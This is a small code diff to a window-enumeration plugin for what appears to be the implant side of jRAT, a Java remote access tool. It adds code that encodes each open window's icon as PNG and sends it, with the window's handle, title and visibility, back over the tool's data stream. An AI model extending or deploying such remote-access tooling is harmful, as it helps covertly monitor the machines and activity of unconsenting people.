@@ -1,9 +1,15 @@
 package se.jrat.plugin.window.stub;
 
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.util.ArrayList;
 import java.util.List;
+
+import javax.imageio.ImageIO;
+import javax.swing.Icon;
+import javax.swing.ImageIcon;
 
 import jrat.api.stub.StubPlugin;
 import nativewindowlib.NativeWindow;
@@ -54,6 +60,19 @@ public class WindowPlugin extends StubPlugin {
 				dos.writeInt(window.getHwnd());
 				writeString(window.getTitle());
 				dos.writeBoolean(window.isVisible());
+
+				Icon icon = window.getIcon();
+				
+				dos.writeBoolean(icon != null);
+				if (icon != null) {
+					ByteArrayOutputStream baos = new ByteArrayOutputStream();
+					
+					ImageIO.write((BufferedImage) ((ImageIcon) window.getIcon()).getImage(), "png", baos);
+					
+					byte[] image = baos.toByteArray();
+					dos.writeInt(image.length);
+					dos.write(image);
+				}
 			}
 		}
 	}
